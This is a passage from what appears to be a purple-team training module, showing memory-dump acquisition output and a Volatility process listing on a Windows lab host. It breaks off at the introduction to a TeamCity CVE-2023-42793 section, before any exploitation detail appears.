Start <span class="hljs-number">0x00002000</span> - Length <span class="hljs-number">0x0009E000</span>
Start <span class="hljs-number">0x00100000</span> - Length <span class="hljs-number">0x0EE9E000</span>
Start <span class="hljs-number">0x0EFA2000</span> - Length <span class="hljs-number">0x0000F000</span>
Start <span class="hljs-number">0x0EFB6000</span> - Length <span class="hljs-number">0x00F2F000</span>
Start <span class="hljs-number">0x0FF75000</span> - Length <span class="hljs-number">0xB008B000</span>
Start <span class="hljs-number">0x100000000</span> - Length <span class="hljs-number">0x40000000</span>
max_physical_memory_ <span class="hljs-number">0x140000000</span>
Acquitision mode PTE Remapping
Padding <span class="hljs-keyword">from</span> <span class="hljs-number">0x00000000</span> to <span class="hljs-number">0x00002000</span>
pad
 - length: <span class="hljs-number">0x2000</span>

<span class="hljs-number">00</span>% <span class="hljs-number">0x00000000</span> .
copy_memory
 - start: <span class="hljs-number">0x2000</span>
 - end: <span class="hljs-number">0xa0000</span>

<span class="hljs-number">00</span>% <span class="hljs-number">0x00002000</span> .
Padding <span class="hljs-keyword">from</span> <span class="hljs-number">0x000A0000</span> to <span class="hljs-number">0x00100000</span>
pad
 - length: <span class="hljs-number">0x60000</span>

<span class="hljs-number">00</span>% <span class="hljs-number">0x000A0000</span> .
copy_memory
 - start: <span class="hljs-number">0x100000</span>
 - end: <span class="hljs-number">0xef9e000</span>

<span class="hljs-number">00</span>% <span class="hljs-number">0x00100000</span> ...............
Padding <span class="hljs-keyword">from</span> <span class="hljs-number">0x0EF9E000</span> to <span class="hljs-number">0x0EFA2000</span>
pad
 - length: <span class="hljs-number">0x4000</span>

<span class="hljs-number">04</span>% <span class="hljs-number">0x0EF9E000</span> .
copy_memory
 - start: <span class="hljs-number">0xefa2000</span>
 - end: <span class="hljs-number">0xefb1000</span>

<span class="hljs-number">04</span>% <span class="hljs-number">0x0EFA2000</span> .
Padding <span class="hljs-keyword">from</span> <span class="hljs-number">0x0EFB1000</span> to <span class="hljs-number">0x0EFB6000</span>
pad
 - length: <span class="hljs-number">0x5000</span>

<span class="hljs-number">04</span>% <span class="hljs-number">0x0EFB1000</span> .
copy_memory
 - start: <span class="hljs-number">0xefb6000</span>
 - end: <span class="hljs-number">0xfee5000</span>

<span class="hljs-number">04</span>% <span class="hljs-number">0x0EFB6000</span> .
Padding <span class="hljs-keyword">from</span> <span class="hljs-number">0x0FEE5000</span> to <span class="hljs-number">0x0FF75000</span>
pad
 - length: <span class="hljs-number">0x90000</span>

<span class="hljs-number">04</span>% <span class="hljs-number">0x0FEE5000</span> .
copy_memory
 - start: <span class="hljs-number">0xff75000</span>
 - end: <span class="hljs-number">0xc0000000</span>

<span class="hljs-number">04</span>% <span class="hljs-number">0x0FF75000</span> ..................................................
<span class="hljs-number">20</span>% <span class="hljs-number">0x41F75000</span> ..................................................
<span class="hljs-number">36</span>% <span class="hljs-number">0x73F75000</span> ..................................................
<span class="hljs-number">51</span>% <span class="hljs-number">0xA5F75000</span> ...........................
Padding <span class="hljs-keyword">from</span> <span class="hljs-number">0xC0000000</span> to <span class="hljs-number">0x100000000</span>
pad
 - length: <span class="hljs-number">0x40000000</span>

<span class="hljs-number">60</span>% <span class="hljs-number">0xC0000000</span> ..................................................
<span class="hljs-number">60</span>% <span class="hljs-number">0xC0000000</span> ..............
copy_memory
 - start: <span class="hljs-number">0x100000000</span>
 - end: <span class="hljs-number">0x140000000</span>
&lt;SNIP&gt;
<span class="hljs-number">80</span>% <span class="hljs-number">0x100000000</span> ..................................................
<span class="hljs-number">95</span>% <span class="hljs-number">0x132000000</span> ..............
The <span class="hljs-keyword">system</span> time is: <span class="hljs-number">12</span>:<span class="hljs-number">24</span>:<span class="hljs-number">28</span>
Driver Unloaded.
</code></pre>
<p>The raw memory dump will be saved to the specified output path and will be ready for further forensic analysis.</p>
<h3 id="analyzing-memory">Analyzing Memory</h3>
<p>All Windows Purple module targets come pre-installed with <code>Volatility v2</code> and <code>Volatility v3</code>, powerful tools for analyzing memory dumps. After capturing a memory dump from a Windows Purple module target, memory forensics could be performed using <code>Volatility v3</code> as follows (in this case, we are using Volatility&#39;s <code>windows.pslist</code> plugin to list active processes within the memory dump).</p>
<p>&#x20; Dumping &amp; Analyzing Windows Memory</p>
<pre><code class="lang-cmd-session">C:\Tools\volatility3&gt;python vol.py -q -f C:\Tools\Memory-Dump\LOGGING-VM-<span class="hljs-number">20241126</span>-<span class="hljs-number">111433</span>.raw windows.pslist
Volatility <span class="hljs-number">3</span> Framework <span class="hljs-number">2</span>.<span class="hljs-number">7</span>.<span class="hljs-number">0</span>

PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime      File output

<span class="hljs-number">4</span>       <span class="hljs-number">0</span>       System  <span class="hljs-number">0</span>x8d81eb28b2c0  <span class="hljs-number">117</span>     -       N/<span class="hljs-keyword">A</span>     False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">40.000000</span>      N/<span class="hljs-keyword">A</span>           Disabled
<span class="hljs-number">88</span>      <span class="hljs-number">4</span>       Registry        <span class="hljs-number">0</span>x8d81eb2ee080  <span class="hljs-number">4</span>       -       N/<span class="hljs-keyword">A</span>     False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">35.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">276</span>     <span class="hljs-number">4</span>       smss.exe        <span class="hljs-number">0</span>x8d81ee0b0040  <span class="hljs-number">3</span>       -       N/<span class="hljs-keyword">A</span>     False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">40.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">384</span>     <span class="hljs-number">368</span>     csrss.exe       <span class="hljs-number">0</span>x8d81ee36f080  <span class="hljs-number">10</span>      -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">47.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">484</span>     <span class="hljs-number">368</span>     wininit.exe     <span class="hljs-number">0</span>x8d81eec7e080  <span class="hljs-number">4</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">47.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">492</span>     <span class="hljs-number">476</span>     csrss.exe       <span class="hljs-number">0</span>x8d81eeca2140  <span class="hljs-number">9</span>       -       <span class="hljs-number">1</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">47.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">560</span>     <span class="hljs-number">476</span>     winlogon.exe    <span class="hljs-number">0</span>x8d81eecc70c0  <span class="hljs-number">4</span>       -       <span class="hljs-number">1</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">47.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">624</span>     <span class="hljs-number">484</span>     services.exe    <span class="hljs-number">0</span>x8d81eecee080  <span class="hljs-number">7</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">47.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">640</span>     <span class="hljs-number">484</span>     lsass.exe       <span class="hljs-number">0</span>x8d81eecea080  <span class="hljs-number">8</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">48.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">744</span>     <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81ee33d080  <span class="hljs-number">1</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">48.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">764</span>     <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81ee3170c0  <span class="hljs-number">14</span>      -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">48.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">784</span>     <span class="hljs-number">484</span>     fontdrvhost.ex  <span class="hljs-number">0</span>x8d81eed70080  <span class="hljs-number">5</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">48.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">792</span>     <span class="hljs-number">560</span>     fontdrvhost.ex  <span class="hljs-number">0</span>x8d81eed6f080  <span class="hljs-number">5</span>       -       <span class="hljs-number">1</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">48.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">868</span>     <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81eed71080  <span class="hljs-number">9</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">49.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">940</span>     <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81eede2080  <span class="hljs-number">10</span>      -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">49.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">1008</span>    <span class="hljs-number">560</span>     dwm.exe <span class="hljs-number">0</span>x8d81eedf3080  <span class="hljs-number">11</span>      -       <span class="hljs-number">1</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">49.000000</span>      N/<span class="hljs-keyword">A</span>           Disabled
<span class="hljs-number">312</span>     <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81eedc4080  <span class="hljs-number">6</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">49.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">348</span>     <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81eedc2080  <span class="hljs-number">37</span>      -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">49.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">760</span>     <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81ef53e080  <span class="hljs-number">2</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">49.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">620</span>     <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81eedc9080  <span class="hljs-number">3</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">49.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">884</span>     <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81ef52f0c0  <span class="hljs-number">2</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">49.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">960</span>     <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81eed91080  <span class="hljs-number">3</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">49.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">1140</span>    <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81ef5a1080  <span class="hljs-number">9</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">49.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">1224</span>    <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81ef610080  <span class="hljs-number">1</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">49.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">1304</span>    <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81ef663080  <span class="hljs-number">4</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">49.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">1320</span>    <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81ef660080  <span class="hljs-number">5</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">50.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">1388</span>    <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81ef6d1080  <span class="hljs-number">2</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">50.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">1396</span>    <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81ef6cf080  <span class="hljs-number">8</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">50.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">1404</span>    <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81ef6cc080  <span class="hljs-number">4</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">50.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">1444</span>    <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81ef72c080  <span class="hljs-number">4</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">50.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">1520</span>    <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81eb355080  <span class="hljs-number">6</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">50.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">1532</span>    <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81eb35c080  <span class="hljs-number">6</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">50.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">1552</span>    <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81eb364080  <span class="hljs-number">12</span>      -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">50.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">1576</span>    <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81eb333080  <span class="hljs-number">9</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">50.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">1676</span>    <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81eb318080  <span class="hljs-number">7</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">50.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">1728</span>    <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81eb344080  <span class="hljs-number">6</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">50.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">1828</span>    <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81ef7d4080  <span class="hljs-number">10</span>      -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">50.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">1876</span>    <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81eb380080  <span class="hljs-number">5</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">50.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">1924</span>    <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81eb391080  <span class="hljs-number">5</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">50.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">1688</span>    <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81ef898080  <span class="hljs-number">6</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">51.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">1820</span>    <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81ef893080  <span class="hljs-number">8</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">51.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">2056</span>    <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81ef878080  <span class="hljs-number">6</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">51.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">2076</span>    <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81ef908080  <span class="hljs-number">2</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">51.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">2136</span>    <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81ef8ea080  <span class="hljs-number">15</span>      -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">51.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">2392</span>    <span class="hljs-number">1552</span>    cmd.exe <span class="hljs-number">0</span>x8d81ef95c080  <span class="hljs-number">0</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">52.000000</span>      <span class="hljs-number">2024-11-20</span> <span class="hljs-number">13</span>:<span class="hljs-number">10</span>:<span class="hljs-number">54.000000</span>    Disabled
<span class="hljs-number">2504</span>    <span class="hljs-number">2392</span>    conhost.exe     <span class="hljs-number">0</span>x8d81efa9c080  <span class="hljs-number">4</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">53.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">2580</span>    <span class="hljs-number">624</span>     spoolsv.exe     <span class="hljs-number">0</span>x8d81efb05080  <span class="hljs-number">11</span>      -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">53.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">2664</span>    <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81efb2d080  <span class="hljs-number">14</span>      -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">54.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">2672</span>    <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81efb4a080  <span class="hljs-number">5</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">54.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">2680</span>    <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81efb47080  <span class="hljs-number">10</span>      -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">54.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">2692</span>    <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81efb43080  <span class="hljs-number">4</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">54.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">2748</span>    <span class="hljs-number">624</span>     osqueryd.exe    <span class="hljs-number">0</span>x8d81efb37080  <span class="hljs-number">3</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">54.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">2784</span>    <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81efb26080  <span class="hljs-number">6</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">54.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">2800</span>    <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81ef424080  <span class="hljs-number">3</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">54.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">2808</span>    <span class="hljs-number">624</span>     ssh-agent.exe   <span class="hljs-number">0</span>x8d81ef423080  <span class="hljs-number">2</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">54.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">2816</span>    <span class="hljs-number">624</span>     sshd.exe        <span class="hljs-number">0</span>x8d81ef41d0c0  <span class="hljs-number">2</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">54.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">2844</span>    <span class="hljs-number">624</span>     Sysmon64.exe    <span class="hljs-number">0</span>x8d81efbd6080  <span class="hljs-number">16</span>      -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">54.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">2860</span>    <span class="hljs-number">624</span>     TeamCityServic  <span class="hljs-number">0</span>x8d81efbc1080  <span class="hljs-number">5</span>       -       <span class="hljs-number">0</span>       True    <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">54.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">2888</span>    <span class="hljs-number">624</span>     vm3dservice.ex  <span class="hljs-number">0</span>x8d81efb8e080  <span class="hljs-number">4</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">55.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">2896</span>    <span class="hljs-number">624</span>     VGAuthService.  <span class="hljs-number">0</span>x8d81efb8c080  <span class="hljs-number">2</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">55.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">2904</span>    <span class="hljs-number">624</span>     vmtoolsd.exe    <span class="hljs-number">0</span>x8d81efb90080  <span class="hljs-number">13</span>      -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">55.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">2912</span>    <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81efbbf080  <span class="hljs-number">3</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">55.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">2924</span>    <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81efbb9400  <span class="hljs-number">6</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">55.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">2948</span>    <span class="hljs-number">624</span>     svchost.exe     <span class="hljs-number">0</span>x8d81efc4d080  <span class="hljs-number">4</span>       -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">55.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
<span class="hljs-number">2956</span>    <span class="hljs-number">624</span>     velociraptor.e  <span class="hljs-number">0</span>x8d81efc4e080  <span class="hljs-number">10</span>      -       <span class="hljs-number">0</span>       False   <span class="hljs-number">2024-11-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">55.000000</span>            N/<span class="hljs-keyword">A</span>     Disabled
</code></pre>
<hr>
<h2 id="usage-example-jetbrains-teamcity-cve-2023-42793">Usage Example: JetBrains TeamCity CVE-2023-42793</h2>
<h3 id="introduction">Introduction</h3>
<p>In today&#39;s fast-paced software development landscape, Continuous Integration and Continuous Deployment (CI/CD) servers are essential for automating build, test, and deployment workflows. Tools like <a href="https://www.jetbrains.com/teamcity/">JetBrains TeamCity</a> streamline the integration of code changes from multiple developers, enabling frequent and reliable software releases. TeamCity, a popular CI/CD platform, is trusted by development teams worldwide for its robust feature set and user-friendly interface. However, like all software, it is not immune to vulnerabilities that can threaten the security of the development pipeline.</p>
<p>This section provides a comprehensive analysis of <a href="https://nvd.nist.gov/vuln/detail/cve-2023-42793">CVE-2023-42793</a>, a critical vulnerability in TeamCity, detailing its underpinnings, exploitation techniques, mitigation strategies, and detection strategies.</p>
<p>This section is divided into two parts:</p>
